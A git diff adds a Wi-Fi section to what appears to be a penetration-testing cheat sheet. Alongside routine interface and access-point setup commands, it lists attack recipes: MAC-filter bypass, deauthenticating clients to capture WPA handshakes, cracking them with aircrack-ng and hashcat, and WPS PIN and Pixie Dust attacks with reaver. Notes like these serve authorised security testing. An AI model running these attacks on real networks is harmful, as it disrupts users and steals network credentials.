@@ -98,6 +98,8 @@
 - [OSINT](#osint)
 - [Game Hacking](#game-hacking)
 - [Wi-Fi](#wi-fi)
+  - [Commands](#commands)
+  - [Create AP with Raspberry Pi](#create-ap-with-raspberry-pi)
 - [GitHub](#github)
   - [Dork](#dork)
   - [GraphQL API: Query Example](#graphql-api-query-example)
@@ -2416,6 +2418,215 @@ openssl req -x509 -newkey rsa:4096 -noenc -out cert.pem -keyout key.pem -days 36
 Tools
 
 - [t6x/reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x)
+
+### Commands
+
+Basic command
+
+```bash
+# address on a devices
+ip addr show
+
+# list wireless interfaces
+iw dev
+
+# wireless interface
+iw dev wlan info
+
+# all wireless devices
+iw list
+
+# scan SSID
+iw dev wlan0 scan | grep SSID
+iw dev wlan0 scan | egrep "DS Parameter set|SSID:"
+
+# create wlan0mon interface with enabled monitor mode
+iw dev wlan0 interface add wlan0mon type monitor
+iw wlan0mon set channel 3
+ip link set wlan0mon up
+
+# delete wlan0mon
+iw dev wlan0mon interface del
+
+# enable monitor mode
+ip link set wlan0 down
+iw wlan0 set monitor control
+ip link set wlan0 up
+
+# disable monitor mode
+ip link set wlan0 down
+iw wlan0 set type managed
+ip link set wlan0 up
+
+# enable monitor mode with airmon-ng
+airmon-ng check
+airmon-ng check kill
+airmon-ng start wlan0
+airmon-ng stop wlan0
+
+# rfkill
+rfkill list
+rfkill block 0
+rfkill unblock 0
+rfkill block all
+
+# list devices
+nmcli device wifi list
+
+# connect
+nmcli dev wifi connect SSID password PASSWORD
+nmcli dev wifi connect SSID wep-key0 WEP_KEY
+
+# disconnect
+nmcli connection down SSID
+
+# connect with wpa_supplicant
+wpa_passphrase SSID PASSWORD > wpa_supplicant.conf
+wpa_supplicant -B -i wlan0 -c wpa_supplicant.conf
+dhclient wlan0
+
+# static IP
+ip addr add 192.168.50.20/24 dev wlan0
+ip link set wlan0 up
+
+# clear
+pkill wpa_supplicant
+ip addr flush dev wlan0
+
+# bypass MAC filter
+ip link set wlan2 down
+macchanger -m CLIENT_MAC wlan2
+ip link set wlan2 up
+```
+
+capture
+
+```bash
+tcpdump -i wlan0
+
+airodump-ng wlan0
+
+# scan 2.4Ghz and 5Ghz
+airodump-ng wlan0 --band abg
+
+# write file
+airodump-ng wlan0 --uptime --gpsd --output-format csv,pcap --write capture
+```
+
+aireplay-ng
+
+```bash
+# set wlan0 to monitor mode
+
+# set the same channel of the AP
+iw dev wlan0 set channel 6
+
+airodump-ng wlan0 --essid ESSID --channel 6
+
+aireplay-ng -9 -e ESSID -a BSSID wlan0
+```
+
+Deauthenticate Attack
+
+```bash
+# capture
+airodump-ng wlan0 --channel 6 -w wpa --bssid BSSID
+
+# a client connects to the AP, then airodump-ng shows STATION which is client MAC address
+# execute ping from client to AP
+
+# deauthenticate
+aireplay-ng wlan0 --deauth 10 -a BSSID -c CLIENT
+
+# pop `WPA handshake: BSSID` in airodump-ng
+
+# crack by aircrack-ng
+aircrack-ng -w passwords.txt -e ESSID -b BSSID wpa-01.cap
+
+# crack by hashcat
+/usr/lib/hashcat-utils/cap2hccapx.bin wpa-01.cap wpa-01.hccapx
+hashcat -m 2500 --deprecated-check-disable wpa-01.hccapx passwords.txt --quiet
+
+# confirm decrypt packets
+airdecap-ng -b BSSID -e ESSID -p PASSWORD wpa-01.cap
+```
+
+WPS Attack
+
+```bash
+wash -i wlan0
+
+reaver -b BSSID -i wlan0 -v
+
+# pixiedust attack
+reaver -b BSSID -i wlan0 -v -K
+```
+
+### Create AP with Raspberry Pi
+
+```bash
+#/bin/bash
+# Acccess Point Setup
+# Tested in Raspberry Pi3 Model B, Debian GNU/Linux 12 (bookworm)
+
+set -eux
+
+# apt mirror
+# echo 'Acquire::http::Proxy "http://192.168.0.103:3142";' | tee /etc/apt/apt.conf.d/90mirror
+
+# install requirement packages
+apt update
+apt install -y hostapd dnsmasq dhcpcd iptables
+systemctl stop hostapd dnsmasq dhcpcd
+
+# dhcpcd
+cat <<EOF | tee /etc/dhcpcd.conf
+interface wlan0
+static ip_address=192.168.50.1/24
+nohook wpa_supplicant
+EOF
+
+# DHCP server
+cat <<EOF | tee /etc/dnsmasq.conf
+interface=wlan0
+dhcp-range=192.168.50.10,192.168.50.50,255.255.255.0,24h
+bind-interfaces
+EOF
+
+# AP
+cat <<EOF > /etc/hostapd/hostapd.conf
+interface=wlan0
+driver=nl80211
+ssid=SSID
+hw_mode=g
+channel=7
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase=PASSWORD
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+EOF
+
+echo 'DAEMON_CONF="/etc/hostapd/hostapd.conf"' >> /etc/default/hostapd
+
+# packet forward and NAT
+echo 'net.ipv4.ip_forward=1' | tee -a /etc/sysctl.conf
+sysctl -p
+
+# iptables NAT
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables-save | tee /etc/iptables.ipv4.nat
+echo 'iptables-restore < /etc/iptables.ipv4.nat' > /etc/rc.local
+
+# enable services
+systemctl unmask hostapd
+systemctl enable hostapd dnsmasq dhcpcd
+systemctl restart hostapd dnsmasq dhcpcd6
+```
 
 ## GitHub
 
